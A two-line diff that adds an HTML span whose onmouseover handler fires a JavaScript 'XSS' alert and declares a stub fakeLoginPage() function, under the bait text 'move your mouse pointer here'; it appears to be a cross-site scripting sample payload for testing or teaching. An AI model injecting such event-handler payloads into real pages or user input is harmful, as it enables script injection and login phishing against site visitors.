@@ -1,0 +1,2 @@
+<span onmouseover="javascript:alert('XSS');function
+fakeLoginPage(){...}">move your mouse pointer here</span>
